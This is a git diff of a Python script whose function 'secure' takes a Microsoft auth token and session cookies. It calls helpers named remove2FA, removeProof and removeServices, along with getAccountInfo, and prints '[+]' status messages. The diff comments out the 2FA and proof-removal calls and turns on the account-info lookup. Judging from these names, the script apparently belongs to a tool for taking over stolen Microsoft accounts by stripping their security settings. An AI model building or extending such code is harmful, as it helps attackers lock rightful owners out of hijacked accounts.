@@ -1,5 +1,6 @@
 # from views.utils.securityInformation import securityInformation
-# from views.utils.getAccountInfo import getAccountInfo
+from views.utils.getAccountInfo import getAccountInfo
+from views.utils.removeServices import removeServices
 from views.utils.removeProof import removeProof
 from views.utils.getCookies import getCookies
 from views.utils.polishHost import polishHost
@@ -128,13 +129,13 @@ def secure(msaauth: str):
             print("[+] - Got AMRP")
             proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"
 
-            remove2FA(amrp, cookies[1], cookies[2])
-            print("[+] - Disabled 2FA")
+            # remove2FA(amrp, cookies[1], cookies[2])
 
-            removeProof(amrp, cookies[1], cookies[2], proofsID)
-            print("[+] - Removed Proofs")
+            # removeProof(amrp, cookies[1], cookies[2], proofsID)
             
-        #     accountMSInfo = getAccountInfo(amrp, cookies[2])
+            # removeServices(amrp, cookies[0])
+
+            accountMSInfo = getAccountInfo(amrp, cookies[2])
 
         #     accountInfo["firstName"] = accountMSInfo["firstName"]
         #     accountInfo["lastName"] = accountMSInfo["lastName"]
